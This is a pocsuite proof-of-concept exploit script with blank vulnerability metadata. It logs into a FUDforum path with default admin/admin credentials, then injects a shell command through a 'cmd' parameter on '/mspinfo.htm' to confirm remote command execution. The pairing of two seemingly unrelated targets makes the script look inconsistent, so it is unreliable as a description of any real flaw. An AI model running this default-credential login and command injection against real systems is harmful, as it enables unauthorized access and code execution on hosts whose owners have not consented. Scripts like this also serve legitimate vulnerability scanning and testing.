#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register,Output, POCBase
from pocsuite.thirdparty.guanxing import  parse_ip_port, http_packet, make_verify_url, dnslog

class TestPOC(POCBase):
	vulID = ''''''
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = ''''''
	vulDate = ''''''
	createDate = ''''''
	updateDate = ''''''
	name = ''''''
	desc = ''''''
	solution = ''''''
	severity = '''''' 
	vulType = ''''''
	taskType = ''''''
	references = ['''''']
	appName = ''''''
	appVersion = ''''''
	appPowerLink = ''''''
	samples = ['']
	install_requires = ['''''']

	def _attack(self):
		return self._verify()

	def _verify(self):
		self.url,ip,port = parse_ip_port(self.target, 80)
		result = {}
		s = req.session()
		headers = {
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
			'Content-Type':'application/x-www-form-urlencoded',
			'Referer':self.url
		}
		
		path = '/fudforum/index.php?t=login'
		data = '''login=admin&password=admin&SQ=0&adm='''
		vulur = make_verify_url(self.url, path, mod = 0)
		base_resp = s.post(vulur, headers = headers, verify = False, allow_redirects = False, timeout = 10, data = data)
		if base_resp.status_code == 302:
			print("getit!")
			path = '''/mspinfo.htm?flag=cmd&cmd=echo%20Test^By^ZsfTest$1By$1Zsf'''
			vulurl = make_verify_url(self.url, path, mod = 0)
			resp = s.get(vulurl, headers = headers, verify = False, allow_redirects = False, timeout = 10)
			if "TestByZsf" in resp.content and resp.status_code == 200:
				result['VerifyInfo'] = http_packet(resp)
				result['VerifyInfo']['URL'] = vulurl
				result['VerifyInfo']['port'] = port
		return self.parse_output(result)

	def parse_output(self, result):
		#parse output
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Internet nothing returned')
		return output


register(TestPOC)